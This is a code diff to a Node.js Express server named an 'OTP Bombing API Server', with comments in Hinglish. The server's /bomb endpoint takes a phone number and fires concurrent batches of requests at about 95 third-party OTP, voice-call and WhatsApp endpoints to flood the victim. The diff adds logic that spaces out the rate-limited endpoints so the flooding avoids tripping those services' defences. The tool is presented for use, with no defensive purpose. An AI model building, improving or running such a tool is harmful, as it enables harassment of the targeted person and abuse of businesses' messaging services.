@@ -1,6 +1,6 @@
 // ============================================================
-// api_server.js - OTP Bombing API Server (FINAL MEGA - 95 APIs)
-// 87 Purani + 8 Nayi | 10min Cap | Logs | Delay | Rate Limit Retry
+// api_server.js - OTP Bombing API Server (FINAL - 95 APIs)
+// 95 APIs | Rate Limited Kam Call | 10min Cap | Logs | Delay
 // ============================================================
 
 const express = require('express');
@@ -16,6 +16,7 @@ app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 const MAX_DURATION_MIN = 10;
 const BATCH_DELAY_MS = 100;
 const API_DELAY_MS = 50;
+const RATE_LIMIT_SKIP = 5;  // Har 5 APIs ke baad 1 rate limited API
 
 // ============================================================
 // ===== ALL APIS (95 Total) =====
@@ -23,7 +24,7 @@ const API_DELAY_MS = 50;
 
 const APIS = [
     // ============================================================
-    // 🟢 TIER 1 — OLD RELIABLE (6 APIs)
+    // 🟢 TIER 1 — OLD RELIABLE (6 APIs) — Normal
     // ============================================================
     {
         name: "GetInstaCash",
@@ -105,7 +106,7 @@ const APIS = [
     },
 
     // ============================================================
-    // 🟡 TIER 2 — OLD PURANI WORKING (5 APIs)
+    // 🟡 TIER 2 — OLD PURANI WORKING (5 APIs) — Normal
     // ============================================================
     {
         name: "Tata Capital Voice",
@@ -179,7 +180,7 @@ const APIS = [
     },
 
     // ============================================================
-    // 🟢 TIER 3 — OLD NAYI WORKING (5 APIs)
+    // 🟢 TIER 3 — OLD NAYI WORKING (5 APIs) — Normal
     // ============================================================
     {
         name: "Vedantu",
@@ -235,7 +236,7 @@ const APIS = [
     },
 
     // ============================================================
-    // 🆕 OLD NEW WORKING (4 APIs)
+    // 🆕 OLD NEW WORKING (4 APIs) — Normal
     // ============================================================
     {
         name: "Gokwik_3",
@@ -279,7 +280,7 @@ const APIS = [
     },
 
     // ============================================================
-    // ⚠️  OLD RATE LIMITED (8 APIs)
+    // ⚠️  OLD RATE LIMITED (8 APIs) — Rate Limited (Kam Call)
     // ============================================================
     {
         name: "Gokwik_1",
@@ -362,7 +363,7 @@ const APIS = [
     },
 
     // ============================================================
-    // 🆕 NEW WORKING — 9 APIs (Latest Logs me 200)
+    // 🆕 NEW WORKING — 9 APIs — Normal
     // ============================================================
     {
         name: "JioSaavn",
@@ -462,7 +463,7 @@ const APIS = [
     },
 
     // ============================================================
-    // ⚠️  NEW RATE LIMITED — 6 APIs (Latest Logs me 429)
+    // ⚠️  NEW RATE LIMITED — 6 APIs — Rate Limited
     // ============================================================
     {
         name: "AyushmanLoan",
@@ -548,7 +549,7 @@ const APIS = [
     },
 
     // ============================================================
-    // 🔥 NAYI UNTESTED APIs — Jo Logs Me Working Mili (24 APIs)
+    // 🔥 NAYI UNTESTED APIs — Jo Logs Me Working Mili (24 APIs) — Normal
     // ============================================================
     {
         name: "Vedantu_New",
@@ -830,7 +831,7 @@ const APIS = [
     },
 
     // ============================================================
-    // 🚫 NAYI RATE LIMITED APIs — Jo Logs Me 429 Mili (20 APIs)
+    // 🚫 NAYI RATE LIMITED APIs — 20 APIs — Rate Limited
     // ============================================================
     {
         name: "RojgarKaro_SendOTP",
@@ -1116,7 +1117,7 @@ const APIS = [
     },
 
     // ============================================================
-    // 🆕 NAYI 8 APIs (Purani list me nahi thi)
+    // 🆕 NAYI 8 APIs — Normal / Rate Limited
     // ============================================================
     {
         name: "SabkaLoan",
@@ -1192,22 +1193,22 @@ const APIS = [
     }
 ];
 
+// ============================================================
+// ===== SPLIT APIS — Normal aur Rate Limited alag karo =====
+// ============================================================
+
+const NORMAL_APIS = APIS.filter(api => !api.rateLimit);
+const RATE_LIMIT_APIS = APIS.filter(api => api.rateLimit);
+
 console.log(`✅ Loaded ${APIS.length} total APIs`);
-console.log(`   🟢 Old Reliable: 6`);
-console.log(`   🟡 Old Purani: 5`);
-console.log(`   🟢 Old Nayi: 5`);
-console.log(`   🆕 Old New Working: 4`);
-console.log(`   ⚠️  Old Rate Limited: 8`);
-console.log(`   🆕 New Working (Nayi): 9`);
-console.log(`   ⚠️  New Rate Limited (Nayi): 6`);
-console.log(`   🆕 Nayi Untested Working: 24`);
-console.log(`   ⚠️  Nayi Untested RateLimited: 20`);
-console.log(`   🆕 Nayi 8 APIs (New): 8`);
+console.log(`   🟢 Normal APIs: ${NORMAL_APIS.length}`);
+console.log(`   ⚠️  Rate Limited APIs: ${RATE_LIMIT_APIS.length}`);
 console.log(`⏱️  Max duration cap: ${MAX_DURATION_MIN} minutes`);
 console.log(`⏳ API delay: ${API_DELAY_MS}ms | Batch delay: ${BATCH_DELAY_MS}ms`);
+console.log(`📊 Rate Limit Skip: Har ${RATE_LIMIT_SKIP} normal APIs ke baad 1 rate limited API`);
 
 // ============================================================
-// ===== API CALL FUNCTION (Rate Limit Retry) =====
+// ===== API CALL FUNCTION =====
 // ============================================================
 
 function makeFallbackData(phone, apiName) {
@@ -1295,10 +1296,11 @@ async function makeApiCall(api, phone, retryCount = 0) {
     } catch (err) {
         const responseTime = Date.now() - startTime;
         
+        // 🔥 Rate Limited APIs — sirf 1 retry (3s delay ke saath)
         const isRateLimit = err.response && err.response.status === 429;
         
-        if (isRateLimit && api.rateLimit && retryCount < 3) {
-            console.log(`  🚫 ${api.name} → 429 RATE_LIMITED, retrying in 3s (${retryCount + 1}/3)...`);
+        if (isRateLimit && api.rateLimit && retryCount < 1) {
+            console.log(`  🚫 ${api.name} → 429 RATE_LIMITED, retrying once (${retryCount + 1}/1)...`);
             await new Promise(r => setTimeout(r, 3000));
             return makeApiCall(api, phone, retryCount + 1);
         }
@@ -1316,6 +1318,110 @@ async function makeApiCall(api, phone, retryCount = 0) {
 }
 
 // ============================================================
+// ===== BOMBING LOGIC — Normal APIs + Rate Limited Kam Call =====
+// ============================================================
+
+async function runBombing(phone, effectiveDuration) {
+    const startTime = Date.now();
+    let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
+    
+    let maxRequests = 100;
+    if (effectiveDuration <= 1) maxRequests = 200;
+    else if (effectiveDuration <= 5) maxRequests = 150;
+    else if (effectiveDuration <= 10) maxRequests = 100;
+    else maxRequests = 80;
+
+    // 🔥 Normal APIs shuffle
+    const shuffledNormal = [...NORMAL_APIS];
+    for (let i = shuffledNormal.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [shuffledNormal[i], shuffledNormal[j]] = [shuffledNormal[j], shuffledNormal[i]];
+    }
+
+    // 🔥 Rate Limited APIs shuffle
+    const shuffledRateLimit = [...RATE_LIMIT_APIS];
+    for (let i = shuffledRateLimit.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [shuffledRateLimit[i], shuffledRateLimit[j]] = [shuffledRateLimit[j], shuffledRateLimit[i]];
+    }
+
+    // 🔥 Combined list — har 5 normal APIs ke baad 1 rate limited API
+    const combined = [];
+    let rateLimitIdx = 0;
+    
+    for (let i = 0; i < shuffledNormal.length; i++) {
+        combined.push(shuffledNormal[i]);
+        
+        // Har RATE_LIMIT_SKIP (5) normal APIs ke baad 1 rate limited API
+        if ((i + 1) % RATE_LIMIT_SKIP === 0 && rateLimitIdx < shuffledRateLimit.length) {
+            combined.push(shuffledRateLimit[rateLimitIdx]);
+            rateLimitIdx++;
+        }
+    }
+    
+    // Baaki rate limited APIs add karo (agar bache hain)
+    while (rateLimitIdx < shuffledRateLimit.length) {
+        combined.push(shuffledRateLimit[rateLimitIdx]);
+        rateLimitIdx++;
+    }
+
+    console.log(`📋 Combined list: ${combined.length} APIs (Normal: ${shuffledNormal.length}, Rate Limited: ${shuffledRateLimit.length})`);
+
+    let sent = 0;
+    const BATCH_SIZE = 5;
+    
+    for (let i = 0; i < combined.length && sent < maxRequests; i += BATCH_SIZE) {
+        const batch = combined.slice(i, Math.min(i + BATCH_SIZE, combined.length));
+        
+        const results = await Promise.allSettled(
+            batch.map(api => makeApiCall(api, phone))
+        );
+        
+        for (let k = 0; k < results.length; k++) {
+            const result = results[k];
+            const api = batch[k];
+            
+            if (result.status === 'fulfilled' && result.value && result.value.success) {
+                success++;
+                sent++;
+                const apiName = api.name || '';
+                const isCall = apiName.toLowerCase().includes('call') || apiName.toLowerCase().includes('voice');
+                const isWhatsapp = apiName.toLowerCase().includes('whatsapp') || apiName.toLowerCase().includes('_wa');
+                const type = isCall ? 'CALL' : (isWhatsapp ? 'WA' : 'SMS');
+                const isRL = api.rateLimit ? '[RL]' : '';
+                
+                console.log(`  ✅ [${success}] ${apiName}${isRL} → ${result.value.status} (${result.value.responseTime}ms) [${type}]`);
+                
+                if (isCall) callCount++;
+                else if (isWhatsapp) whatsappCount++;
+                else smsCount++;
+            } else {
+                const apiName = api.name || '';
+                const status = result.value?.status || 'FAIL';
+                const responseTime = result.value?.responseTime || 0;
+                const isRL = api.rateLimit ? '[RL]' : '';
+                
+                if (status === 429) {
+                    console.log(`  🚫 ${apiName}${isRL} → 429 RATE_LIMITED (${responseTime}ms)`);
+                } else {
+                    console.log(`  ❌ ${apiName}${isRL} → ${status} (${responseTime}ms)`);
+                }
+            }
+        }
+        
+        if (i + BATCH_SIZE < combined.length && sent < maxRequests) {
+            await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
+        }
+    }
+
+    const elapsed = (Date.now() - startTime) / 1000;
+    
+    return {
+        success, smsCount, callCount, whatsappCount, elapsed: elapsed.toFixed(1)
+    };
+}
+
+// ============================================================
 // ===== ROUTES =====
 // ============================================================
 
@@ -1324,6 +1430,9 @@ app.get('/', (req, res) => {
         status: 'ok',
         instance: process.env.INSTANCE_NAME || 'api',
         total_apis: APIS.length,
+        normal_apis: NORMAL_APIS.length,
+        rate_limited_apis: RATE_LIMIT_APIS.length,
+        rate_limit_skip: RATE_LIMIT_SKIP,
         max_duration_min: MAX_DURATION_MIN,
         api_delay_ms: API_DELAY_MS,
         uptime: process.uptime()
@@ -1341,71 +1450,12 @@ app.post('/bomb', async (req, res) => {
     const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);
 
     console.log(`\n📱 Bombing ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min | Instance: ${instance || 'default'}`);
+    console.log(`🧪 Normal: ${NORMAL_APIS.length} | Rate Limited: ${RATE_LIMIT_APIS.length} | Every ${RATE_LIMIT_SKIP} normal → 1 RL`);
 
     try {
-        const startTime = Date.now();
-        let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
-        const apiList = APIS;
-        const BATCH_SIZE = 5;
+        const result = await runBombing(phone, effectiveDuration);
         
-        let maxRequests = 100;
-        if (effectiveDuration <= 1) maxRequests = 200;
-        else if (effectiveDuration <= 5) maxRequests = 150;
-        else if (effectiveDuration <= 10) maxRequests = 100;
-        else maxRequests = 80;
-
-        const shuffled = [...apiList];
-        for (let i = shuffled.length - 1; i > 0; i--) {
-            const j = Math.floor(Math.random() * (i + 1));
-            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
-        }
-
-        let sent = 0;
-        for (let i = 0; i < shuffled.length && sent < maxRequests; i += BATCH_SIZE) {
-            const batch = shuffled.slice(i, Math.min(i + BATCH_SIZE, shuffled.length));
-            
-            const results = await Promise.allSettled(
-                batch.map(api => makeApiCall(api, phone))
-            );
-            
-            for (let k = 0; k < results.length; k++) {
-                const result = results[k];
-                const api = batch[k];
-                
-                if (result.status === 'fulfilled' && result.value && result.value.success) {
-                    success++;
-                    sent++;
-                    const apiName = api.name || '';
-                    const isCall = apiName.toLowerCase().includes('call') || apiName.toLowerCase().includes('voice');
-                    const isWhatsapp = apiName.toLowerCase().includes('whatsapp') || apiName.toLowerCase().includes('_wa');
-                    const type = isCall ? 'CALL' : (isWhatsapp ? 'WA' : 'SMS');
-                    
-                    console.log(`  ✅ [${success}] ${apiName} → ${result.value.status} (${result.value.responseTime}ms) [${type}]`);
-                    
-                    if (isCall) callCount++;
-                    else if (isWhatsapp) whatsappCount++;
-                    else smsCount++;
-                } else {
-                    const apiName = api.name || '';
-                    const status = result.value?.status || 'FAIL';
-                    const responseTime = result.value?.responseTime || 0;
-                    
-                    if (status === 429) {
-                        console.log(`  🚫 ${apiName} → 429 RATE_LIMITED (${responseTime}ms)`);
-                    } else {
-                        console.log(`  ❌ ${apiName} → ${status} (${responseTime}ms)`);
-                    }
-                }
-            }
-            
-            if (i + BATCH_SIZE < shuffled.length && sent < maxRequests) {
-                await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
-            }
-        }
-
-        const elapsed = (Date.now() - startTime) / 1000;
-        
-        console.log(`✅ Bombing ${phone} done | Sent: ${success} | SMS: ${smsCount} | Calls: ${callCount} | WA: ${whatsappCount} | ${elapsed.toFixed(1)}s\n`);
+        console.log(`✅ Bombing ${phone} done | Sent: ${result.success} | SMS: ${result.smsCount} | Calls: ${result.callCount} | WA: ${result.whatsappCount} | ${result.elapsed}s\n`);
         
         res.json({
             success: true,
@@ -1413,12 +1463,14 @@ app.post('/bomb', async (req, res) => {
             requested_duration: requestedDuration,
             effective_duration: effectiveDuration,
             instance: instance || 'default',
-            totalSent: success,
-            sms: smsCount,
-            calls: callCount,
-            whatsapp: whatsappCount,
-            elapsed: elapsed.toFixed(1) + 's',
-            total_apis: APIS.length
+            totalSent: result.success,
+            sms: result.smsCount,
+            calls: result.callCount,
+            whatsapp: result.whatsappCount,
+            elapsed: result.elapsed + 's',
+            total_apis: APIS.length,
+            normal_apis: NORMAL_APIS.length,
+            rate_limited_apis: RATE_LIMIT_APIS.length
         });
         
     } catch (error) {
@@ -1430,10 +1482,13 @@ app.post('/bomb', async (req, res) => {
 app.get('/apis', (req, res) => {
     res.json({
         total: APIS.length,
+        normal_apis: NORMAL_APIS.length,
+        rate_limited_apis: RATE_LIMIT_APIS.length,
+        rate_limit_skip: RATE_LIMIT_SKIP,
         max_duration_min: MAX_DURATION_MIN,
         api_delay_ms: API_DELAY_MS,
-        apis: APIS.map(a => a.name),
-        rate_limit_apis: APIS.filter(a => a.rateLimit).map(a => a.name),
+        normal_api_names: NORMAL_APIS.map(a => a.name),
+        rate_limited_api_names: RATE_LIMIT_APIS.map(a => a.name),
         instances: process.env.INSTANCE_NAME || 'api'
     });
 });
@@ -1443,6 +1498,9 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 API Server running on port ${PORT}`);
     console.log(`📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
     console.log(`📊 Total APIs: ${APIS.length}`);
+    console.log(`   🟢 Normal APIs: ${NORMAL_APIS.length}`);
+    console.log(`   ⚠️  Rate Limited APIs: ${RATE_LIMIT_APIS.length}`);
+    console.log(`📊 Rate Limit Skip: Har ${RATE_LIMIT_SKIP} normal APIs ke baad 1 rate limited API`);
     console.log(`⏱️  Max duration: ${MAX_DURATION_MIN} minutes (highest cap)`);
     console.log(`⏳ API delay: ${API_DELAY_MS}ms`);
     console.log(`⏳ Batch delay: ${BATCH_DELAY_MS}ms`);
